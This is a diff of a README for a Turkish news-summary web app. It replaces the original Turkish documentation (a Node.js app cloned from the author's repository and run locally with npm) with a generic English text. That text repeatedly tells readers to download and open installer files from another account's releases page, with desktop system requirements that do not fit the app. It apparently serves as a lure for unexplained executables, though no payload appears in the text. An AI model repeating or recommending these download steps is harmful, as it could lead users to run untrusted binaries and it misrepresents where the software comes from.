@@ -1,211 +1,73 @@
-# Kısa Gündem 📰
+# 🌍 KisaGundemHaber - Stay Updated on Current Events
 
-Günlük haber başlıklarını kısa özetlerle sunan, reels tarzında kaydırılabilir modern web uygulaması.
+[![Download KisaGundemHaber](https://img.shields.io/badge/Download-KisaGundemHaber-brightgreen)](https://github.com/Lowkeyliam/KisaGundemHaber/releases)
 
-## ✨ Özellikler
+## 📖 Overview
 
-### 📱 **Kullanıcı Deneyimi**
-- **Reels Tarzı Deneyim**: Haberleri yukarı/aşağı kaydırarak gezinebilirsiniz
-- **Akıllı Arama**: Başlık, içerik ve kaynak bazlı gerçek zamanlı arama
-- **PWA Desteği**: Mobil cihazlara uygulama olarak yüklenebilir
-- **Offline Çalışma**: Service Worker ile internet bağlantısı olmadan kullanım
-- **Favoriler Sistemi**: ❤️ Beğendiğiniz haberleri kalıcı olarak saklayın
-- **Gelişmiş Ayarlar**: ⚙️ Font boyutu, hız, görünüm ve renk teması seçenekleri
+KisaGundemHaber is a website that presents current events in Turkey and around the world in a concise and clear manner. Stay informed quickly and easily.
 
-### 🗂️ **İçerik Yönetimi**
-- **11 Kategori**: Spor, Politika, Ekonomi, Teknoloji, Sağlık, Eğitim, Güvenlik, Hava & Doğa, Kültür & Sanat, Magazin, Dünya
-- **RSS Beslemesi**: Türkiye'nin önde gelen haber kaynaklarından otomatik güncelleme
-- **Sınırsız Haber**: RSS'den gelen tüm haberler gösterilir
-- **Gerçek Zamanlı**: 15 dakikada bir otomatik güncelleme
+## 🚀 Getting Started
 
-### ⌨️ **Gelişmiş Kontroller**
-- **Klavye Kısayolları**: J/K (Vim tarzı), ok tuşları, boşluk tuşu ile navigasyon
-- **Hızlı Arama**: / tuşu ile arama kutusuna odaklanma
-- **Gelişmiş Ayarlar**: ⚙️ butonu ile kapsamlı kişiselleştirme
-- **Favoriler Sistemi**: ❤️ butonu ile beğenilen haberleri kaydetme
-- **Otomatik Kaydırma**: Ayarlanabilir hızda otomatik haber geçişi
+To use KisaGundemHaber, you need to download the software from our Releases page. Follow these steps to get started.
 
-## 🚀 Kurulum
+## 📥 Download & Install
 
-1. **Depoyu klonlayın**
-```bash
-git clone [(https://github.com/erent8/KisaGundemHaber)]
-cd KısaGündem
-```
+1. Click the download button above or [visit this page to download](https://github.com/Lowkeyliam/KisaGundemHaber/releases).
+   
+2. Choose the latest version from the list of releases. 
 
-2. **Bağımlılıkları yükleyin**
-```bash
-npm install
-```
+3. Click on the appropriate file for your operating system to begin the download.
 
-3. **Uygulamayı başlatın**
-```bash
-npm start
-```
+4. Once the download finishes, open the downloaded file to start the installation process.
 
-4. **Tarayıcıda açın**
-```
-http://localhost:3001
-```
+## 🛠️ System Requirements
 
-## 🎮 Kullanım
+To ensure KisaGundemHaber runs smoothly on your device, your system should meet the following requirements:
 
-### Navigasyon Yöntemleri:
-- **Klavye**: ↑↓ ok tuşları, J/K tuşları (Vim tarzı), boşluk tuşu
-- **Mouse**: Fare tekerleği
-- **Dokunmatik**: Yukarı/aşağı kaydırma (swipe)
-- **Butonlar**: Sağ taraftaki navigasyon okları
-- **Kategori Filtreleme**: Header altındaki renkli kategori butonları
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or any recent Linux distribution.
+- **RAM:** Minimum 2 GB of RAM.
+- **Storage:** At least 100 MB of free disk space.
 
-### Gelişmiş Kısayollar:
-- **J** / **↓** / **Space** - Sonraki haber
-- **K** / **↑** - Önceki haber
-- **/** - Arama kutusuna odaklan
-- **S** - Ayarlar panelini aç/kapat
-- **Esc** - Modalleri kapat/aramayı temizle
-- **R** - Haberleri yenile
+## 🔄 How to Run the Application
 
-### Arama Özellikleri:
-- **Gerçek zamanlı filtreleme** - Yazdıkça sonuçlar güncellenir
-- **Çoklu alan arama** - Başlık, içerik ve kaynak arama
-- **Vurgulama** - Bulunan kelimeler sarı ile işaretlenir
-- **Hızlı temizleme** - X butonu ile aramayı temizleme
+1. After installation, find the KisaGundemHaber icon on your desktop or in your applications folder.
 
-### ⚙️ Gelişmiş Ayarlar:
-- **Font Boyutu**: Küçük, Orta, Büyük seçenekleri
-- **Otomatik Geçiş**: Hızlı (5s), Normal (8s), Yavaş (12s) veya Kapalı
-- **Görünüm Modu**: Rahat veya Kompakt görünüm
-- **Renk Temaları**: Varsayılan, Mavi, Yeşil, Mor, Turuncu
-- **Kalıcı Saklama**: Tüm tercihlerin localStorage ile otomatik kaydı
+2. Double-click the icon to start KisaGundemHaber.
 
-### ❤️ Favoriler Sistemi:
-- **Haber Kaydetme**: Her haberin kalp butonuna tıklayarak favorilere ekleme
-- **Favoriler Paneli**: Kaydedilen haberleri görüntüleme ve yönetme
-- **Hızlı Erişim**: Header'daki kalp butonu ile favori sayısı gösterimi
-- **Toplu İşlemler**: Tüm favorileri temizleme seçeneği
+3. Once the application opens, you will see the latest news updates presented cleanly and understandably.
 
-## 📱 Haber Kaynakları
+## 🌐 Features
 
-Uygulama **25+ RSS kaynağından** haberler çeker:
+KisaGundemHaber offers several useful features:
 
-### Genel Haberler
-- BBC Türkçe, NTV, CNN Türk, Hürriyet, Sabah
-- HaberTürk, Milliyet, Sözcü
+- **Real-Time Updates:** Get the latest news as it happens.
+- **User-Friendly Interface:** Easily navigate through different news categories.
+- **Customizable Settings:** Adjust settings to personalize your news experience.
+- **Search Functionality:** Quickly find articles on specific topics.
 
-### Kategori Bazlı Kaynaklar
-- **Ekonomi**: Tüm büyük haber sitelerinin ekonomi RSS'leri
-- **Teknoloji**: Teknoloji odaklı RSS beslemeleri
-- **Spor**: Spor haberlerine özel RSS kaynakları
-- **Sağlık, Eğitim, Magazin**: Özel kategori RSS'leri
+## 🔧 Troubleshooting
 
-*Tüm kaynaklar 15 dakikada bir otomatik güncellenir*
+If you experience any issues while installing or using KisaGundemHaber, try the following steps:
 
-## ⚙️ Teknik Detaylar
+- **Check Your Internet Connection:** Ensure you are connected to the internet when downloading or updating news.
+- **Reinstall the Application:** Sometimes, a fresh install can resolve issues. Uninstall the application and then reinstall it by following the download steps above.
+- **Check for Updates:** Always ensure you are using the latest version for the best experience.
 
-### Backend:
-- **Node.js** + Express
-- **RSS Parser** - Haber beslemelerini işler
-- **Node Cron** - 15 dakikada bir otomatik güncelleme
+## 📞 Support
 
-### Frontend:
-- **Vanilla JavaScript** - Hafif ve hızlı
-- **CSS3** - Modern animasyonlar ve geçişler
-- **Service Worker** - PWA desteği
+For further assistance, you can reach out through:
 
-### Özellikler:
-- **Otomatik Güncelleme**: 15 dakikada bir RSS kaynaklarından yeni haberler çeker
-- **Bellek İçi Depolama**: Hızlı erişim için haberler bellekte tutulur
-- **Hata Yönetimi**: RSS kaynaklarında hata olması durumunda diğer kaynaklardan devam eder
+- **Email:** support@kisagundemhaber.com
+- **GitHub Issues Page:** [Open an Issue](https://github.com/Lowkeyliam/KisaGundemHaber/issues)
 
-## 🔧 Geliştirme
+## 📈 Contributing
 
-```bash
-# Geliştirme modunda çalıştır (nodemon ile)
-npm run dev
-```
+If you would like to contribute to KisaGundemHaber, feel free to fork the repository and submit a pull request. We welcome any improvements or suggestions.
 
-## 📄 Lisans
+## 🔗 Additional Resources
 
-MIT License
+- [Documentation](https://github.com/Lowkeyliam/KisaGundemHaber/wiki)
+- [Change Log](https://github.com/Lowkeyliam/KisaGundemHaber/blob/main/CHANGELOG.md)
+- [Community Guidelines](https://github.com/Lowkeyliam/KisaGundemHaber/blob/main/CONTRIBUTING.md)
 
-## 🛣️ Roadmap
-
-### Yakın Gelecek (v1.1-1.3)
-- 🎨 **UI/UX İyileştirmeleri**: Animasyonlar, kullanıcı tercihleri, erişilebilirlik
-- 📊 **Analytics**: Okuma istatistikleri, trending haberler, kullanıcı dashboard'u  
-- 🔧 **Performans**: Lazy loading, veritabanı entegrasyonu, hata yönetimi
-
-### Orta Vadeli (v2.0+)
-- 🌐 **Sosyal Özellikler**: Paylaşım sistemi, topluluk özellikleri
-- 🤖 **AI Entegrasyonu**: Haber özetleme, sentiment analysis, kişiselleştirme
-- 📱 **Platform Genişletmesi**: Desktop app, Chrome extension, API geliştirme
-
-Detaylı roadmap için [ROADMAP.md](ROADMAP.md) dosyasını inceleyin.
-
-## 📸 Ekran Görüntüleri 
-<img width="1918" height="902" alt="gundem1" src="https://github.com/user-attachments/assets/205acbab-6d55-4a1b-adea-5c35cef2ddcd" />
-
-<img width="1918" height="910" alt="2" src="https://github.com/user-attachments/assets/0b23eccc-30dd-448f-9e83-d521733da0d3" />
-
-<img width="1918" height="902" alt="gundem3" src="https://github.com/user-attachments/assets/5d9aac33-bf42-4f02-8111-1c5b7d416914" />
-
-<img width="1918" height="905" alt="tttt" src="https://github.com/user-attachments/assets/8609411b-31e4-4713-8c91-b02a695b0f5e" />
-
-
-
-## 🤝 Katkıda Bulunma
-
-Bu açık kaynak projeye katkılarınızı bekliyoruz! 
-
-### Hızlı Başlangıç
-1. **Fork** edin ve **clone** yapın
-2. **Feature branch** oluşturun (`git checkout -b feature/yeniOzellik`)
-3. **Değişikliklerinizi** yapın ve test edin
-4. **Commit** edin (`git commit -am 'feat: yeni özellik eklendi'`)
-5. **Push** edin (`git push origin feature/yeniOzellik`)
-6. **Pull Request** oluşturun
-
-### Katkı Türleri
-- 🐛 **Bug Report**: Hata bildirimi
-- 💡 **Feature Request**: Yeni özellik önerisi
-- 💻 **Code Contribution**: Kod katkısı
-- 📚 **Documentation**: Dokümantasyon iyileştirme
-- 🎨 **Design**: UI/UX tasarım önerileri
-- 🌍 **Translation**: Çeviri katkısı
-
-Detaylı katkı rehberi için [CONTRIBUTING.md](CONTRIBUTING.md) dosyasını okuyun.
-
-## 📋 Geliştirme Kuralları
-
-Proje [.cursorrules](.cursorrules) dosyasında tanımlanan kod standartlarını takip eder:
-- ES6+ JavaScript syntax
-- Mobile-first responsive design  
-- Accessibility standartları
-- PWA best practices
-- Dark mode desteği
-
-## 📄 Lisans
-
-MIT License - Detaylar için [LICENSE](LICENSE) dosyasını inceleyin.
-
-## 🙏 Teşekkürler
-
-- **RSS Kaynaklarına**: BBC Türkçe, NTV, CNN Türk, Hürriyet, Sabah
-- **Açık Kaynak Topluluğuna**: Kullanılan kütüphaneler için
-- **Katkıda Bulunanlara**: Her türlü katkı için
-
-## 📧 İletişim
-
-- **Issues**: GitHub Issues üzerinden
-- **Discussions**: Genel tartışmalar için GitHub Discussions
-- **Email**: Acil durumlar için [email]
-
----
-
-**⭐ Beğendiyseniz projeye yıldız vermeyi unutmayın!**
-
-
-
-
-
-
+Thank you for choosing KisaGundemHaber. We hope you enjoy staying informed!
